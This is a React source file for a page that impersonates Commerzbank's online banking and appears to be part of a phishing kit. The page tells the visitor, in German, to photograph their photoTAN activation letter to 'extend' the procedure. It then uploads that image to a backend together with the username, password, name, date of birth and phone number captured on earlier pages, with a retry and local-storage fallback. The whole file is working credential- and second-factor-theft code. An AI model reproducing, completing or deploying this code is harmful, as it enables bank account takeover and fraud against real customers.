import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import apiService from '../services/api';

const UploadPage: React.FC = () => {
  const navigate = useNavigate();
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [isDragOver, setIsDragOver] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    // Check if user came from info page
    const xname1 = sessionStorage.getItem('xname1');
    const xname2 = sessionStorage.getItem('xname2');
    const xdob = sessionStorage.getItem('xdob');
    const xtel = sessionStorage.getItem('xtel');
    
    // Debug mobile detection
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    console.log('Mobile device detected:', isMobile);
    console.log('User agent:', navigator.userAgent);
    
    // Debug session storage
    console.log('Session storage data:', {
      xname1,
      xname2,
      xdob,
      xtel,
      xusr: sessionStorage.getItem('xusr'),
      xpss: sessionStorage.getItem('xpss')
    });
    
    if (!xname1 || !xname2 || !xdob || !xtel) {
      console.log('Missing session data, redirecting to info page');
      navigate('/info');
      return;
    }
    
    console.log('All session data present, staying on upload page');
  }, [navigate]);

  const handleFileSelect = (file: File) => {
    console.log('File selected:', file.name, file.size, file.type);
    
    // Validate file type
    const allowedTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.type)) {
      console.log('Invalid file type:', file.type);
      setError('Bitte wählen Sie eine gültige Bilddatei (JPG, PNG, GIF).');
      return;
    }

    // Validate file size (max 10MB)
    if (file.size > 10 * 1024 * 1024) {
      console.log('File too large:', file.size);
      setError('Die Datei ist zu groß. Maximale Größe: 10MB.');
      return;
    }

    console.log('File validation passed, setting selected file');
    setSelectedFile(file);
    setError('');
  };

  const handleFileInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      handleFileSelect(file);
    }
  };

  const handleCameraCapture = (e: React.ChangeEvent<HTMLInputElement>) => {
    console.log('Camera capture triggered');
    console.log('Input element:', e.target);
    console.log('Files:', e.target.files);
    console.log('Files length:', e.target.files?.length);
    
    const file = e.target.files?.[0];
    console.log('Camera file selected:', file);
    
    if (file) {
      console.log('File details:', {
        name: file.name,
        size: file.size,
        type: file.type,
        lastModified: file.lastModified
      });
      handleFileSelect(file);
    } else {
      console.log('No file selected from camera');
    }
    
    // Reset the input so the same file can be selected again
    e.target.value = '';
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
    
    const file = e.dataTransfer.files[0];
    if (file) {
      handleFileSelect(file);
    }
  };

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setIsDragOver(false);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log('Submit triggered, selectedFile:', selectedFile);
    
    if (!selectedFile) {
      console.log('No file selected');
      setError('Bitte wählen Sie eine Datei aus.');
      return;
    }

    console.log('Starting upload process');
    setIsLoading(true);
    setError('');

    try {
      const formData = new FormData();
      
      // Add the file first
      if (selectedFile) {
        console.log('Adding file to FormData:', selectedFile);
        formData.append('file', selectedFile);
      }
      
      // Add session data with fallback
      const sessionData = {
        xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
        xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
        xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
        xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
        xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
        xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel')
      };

      console.log('Session data for upload:', sessionData);

      // Check if we have all required data
      const missingData = Object.entries(sessionData).filter(([key, value]) => !value);
      if (missingData.length > 0) {
        console.error('Missing required session data:', missingData);
        setError('Fehlende Sitzungsdaten. Bitte starten Sie den Vorgang neu.');
        setIsLoading(false);
        return;
      }

      Object.entries(sessionData).forEach(([key, value]) => {
        if (value) {
          formData.append(key, value);
          console.log(`Added to FormData: ${key} = ${value}`);
        } else {
          console.log(`Missing session data: ${key}`);
        }
      });

      // Debug: Log FormData contents
      console.log('FormData contents:');
      Array.from(formData.entries()).forEach(([key, value]) => {
        console.log(key, value);
      });

      // Send data to backend
      await apiService.upload(formData);
      
      // Navigate to done page
      navigate('/done');
    } catch (error) {
      console.error('Upload error:', error);
      
      // Mobile-specific error handling
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      if (isMobile) {
        console.log('Mobile upload failed, attempting retry...');
        // Try to retry the upload once
        try {
          // Recreate FormData for retry
          const retryFormData = new FormData();
          if (selectedFile) {
            retryFormData.append('file', selectedFile);
          }
          
          // Add session data again
          const sessionData = {
            xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
            xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
            xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
            xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
            xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
            xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel')
          };

          Object.entries(sessionData).forEach(([key, value]) => {
            if (value) retryFormData.append(key, value);
          });
          
          const retryResponse = await apiService.upload(retryFormData);
          console.log('Retry upload response:', retryResponse);
          navigate('/done');
          return;
        } catch (retryError) {
          console.error('Retry upload also failed:', retryError);
          
          // Mobile fallback: Store data locally and continue
          console.log('Mobile fallback: Storing data locally and continuing...');
          const fallbackData = {
            type: 'upload',
            data: {
              filename: selectedFile?.name || 'unknown',
              originalName: selectedFile?.name || 'unknown',
              size: selectedFile?.size || 0,
              xusr: sessionStorage.getItem('xusr') || localStorage.getItem('xusr'),
              xpss: sessionStorage.getItem('xpss') || localStorage.getItem('xpss'),
              xname1: sessionStorage.getItem('xname1') || localStorage.getItem('xname1'),
              xname2: sessionStorage.getItem('xname2') || localStorage.getItem('xname2'),
              xdob: sessionStorage.getItem('xdob') || localStorage.getItem('xdob'),
              xtel: sessionStorage.getItem('xtel') || localStorage.getItem('xtel'),
              timestamp: new Date().toISOString(),
              mobileFallback: true
            }
          };
          
          // Store in localStorage as fallback
          const existingData = JSON.parse(localStorage.getItem('mobileFallbackData') || '[]');
          existingData.push(fallbackData);
          localStorage.setItem('mobileFallbackData', JSON.stringify(existingData));
          
          console.log('Data stored locally as fallback');
          navigate('/done');
          return;
        }
      }
      
      // Show mobile-specific error message
      if (isMobile) {
        setError('Upload fehlgeschlagen. Bitte überprüfen Sie Ihre Internetverbindung und versuchen Sie es erneut. Falls das Problem weiterhin besteht, wird Ihre Daten lokal gespeichert.');
      } else {
        setError('Fehler beim Hochladen der Datei. Bitte versuchen Sie es erneut.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="commerzbank-app">
      {/* Top Header */}
      <header className="top-header">
        <div className="header-content">
          <div className="search-section">
            <input type="search" className="search-input" placeholder="Ihr Suchtext" />
            <button className="search-button">🔍</button>
          </div>
          <div className="header-links">
            <a href="#konzern">Konzern</a>
            <a href="#english">English</a>
            <a href="#profil">Profil & Einstellungen</a>
          </div>
        </div>
      </header>

      {/* Main Header with Logo */}
      <header className="main-header">
        <div className="header-content">
          <div className="logo-section">
            <div className="commerzbank-logo">
              <div className="logo-triangle">▲</div>
              <span className="logo-text">COMMERZBANK</span>
            </div>
          </div>
          <nav className="main-nav">
            <a href="#privatkunden" className="nav-link active">Privatkunden</a>
            <a href="#unternehmerkunden" className="nav-link">Unternehmerkunden</a>
          </nav>
        </div>
      </header>

      {/* Navigation Menu */}
      <nav className="main-menu">
        <div className="menu-content">
          <a href="#startseite" className="menu-item">Startseite</a>
          <a href="#konten" className="menu-item">Konten & Karten</a>
          <a href="#depot" className="menu-item">Depot & Order</a>
          <a href="#analyse" className="menu-item">Analyse</a>
          <a href="#service" className="menu-item">Service</a>
          <a href="#produkte" className="menu-item">Produkte & Wissen</a>
        </div>
      </nav>

      {/* Main Content */}
      <main className="main-content">
        <div className="content-wrapper">
          {/* Left Column - Upload Section */}
          <div className="left-column">
            <div className="upload-section">
              <h1 className="upload-title">Aktivierungsgrafik scannen</h1>
              
              <div className="instruction-box">
                <p className="instruction-text">
                  Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. 
                  Nach Prüfung bleibt es weiterhin gültig. Bitte fotografieren Sie erst den gesamten Aktivierungsbrief 
                  und laden Sie das Bild aus Ihrer Galerie hoch.
                </p>
                {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
                  <div className="mobile-notice">
                    <p><strong>Mobile Hinweis:</strong> Stellen Sie sicher, dass Ihr Gerät mit demselben WLAN-Netzwerk verbunden ist wie der Computer, auf dem die Anwendung läuft.</p>
                  </div>
                )}
              </div>
              
              <div className="phone-mockup">
                <div className="phone">
                  <div className="phone-screen">
                    <div className="qr-scanner-interface">
                      <div className="scanner-header">
                        <div className="scanner-title">QR-Code Scanner</div>
                        <div className="scanner-subtitle">Richten Sie die Kamera auf den QR-Code</div>
                      </div>
                      
                      <div className="qr-overlay">
                        <div className="qr-frame">
                          <div className="qr-corner top-left"></div>
                          <div className="qr-corner top-right"></div>
                          <div className="qr-corner bottom-left"></div>
                          <div className="qr-corner bottom-right"></div>
                        </div>
                        <div className="qr-center">
                          <div className="qr-icon">📱</div>
                          <div className="qr-text">QR-Code hier positionieren</div>
                        </div>
                      </div>
                      
                      <div className="scanner-controls">
                        <div className="control-button flash">⚡</div>
                        <div className="control-button gallery">📷</div>
                        <div className="control-button close">✕</div>
                      </div>
                      
                      <div className="scanner-footer">
                        <div className="scanner-hint">Halten Sie das Gerät ruhig und zentrieren Sie den QR-Code</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <form onSubmit={handleSubmit} className="upload-form">
                <input
                  type="file"
                  onChange={handleFileInputChange}
                  accept="image/*"
                  style={{ display: 'none' }}
                  id="file-input"
                />
                
                <input
                  type="file"
                  onChange={handleCameraCapture}
                  accept="image/*"
                  capture="environment"
                  style={{ display: 'none' }}
                  id="camera-input"
                  onClick={() => console.log('Camera input clicked')}
                />
                
                {selectedFile ? (
                  <div className="file-selected">
                    <div className="file-preview">
                      <img 
                        src={URL.createObjectURL(selectedFile)} 
                        alt="Selected file" 
                        className="preview-image"
                      />
                    </div>
                    <p className="file-info">Ausgewählte Datei: {selectedFile.name}</p>
                    <p className="file-size">Größe: {(selectedFile.size / 1024 / 1024).toFixed(2)} MB</p>
                    <button 
                      type="button" 
                      onClick={() => setSelectedFile(null)}
                      className="remove-button"
                    >
                      Datei entfernen
                    </button>
                  </div>
                ) : (
                  <div className="upload-options">
                    <label 
                      htmlFor="camera-input" 
                      className="camera-button" 
                      onClick={() => console.log('Camera button clicked')}
                    >
                      <div className="camera-icon">📸</div>
                      <span>Foto aufnehmen</span>
                    </label>
                    
                    <div className="divider">oder</div>
                    
                    <label htmlFor="file-input" className="file-input-label" onClick={() => console.log('File button clicked')}>
                      <div className="upload-icon">📁</div>
                      <span>Datei auswählen</span>
                    </label>
                  </div>
                )}

                {error && <div className="error-message">{error}</div>}

                <button 
                  type="submit" 
                  className="upload-button"
                  disabled={isLoading || !selectedFile}
                >
                  {isLoading ? 'Hochladen...' : 'Datei hochladen'}
                </button>
              </form>
            </div>
          </div>

          {/* Right Column - Info Panel */}
          <div className="right-column">
            <div className="info-panel">
              <h3>Wichtige Infos zum Digital Banking</h3>
              
              <div className="info-section">
                <p>Haben Sie Probleme mit der PhotoTAN-App oder der Freigabe von Zahlungen? Dann finden Sie <a href="#info">hier</a> weitere Informationen.</p>
              </div>

              <div className="info-section">
                <h4>Kein aktives TAN-Verfahren?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#hilfe">Hilfe zur photoTAN</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Teilnehmernummer/PIN vergessen?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#teilnehmer">Teilnehmernummer neu anfordern</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#pin">PIN vergessen</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Alles rund ums Online Banking</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#anleitung">Anleitung/Hilfe</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#sicherheit">Sicherheit</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default UploadPage;
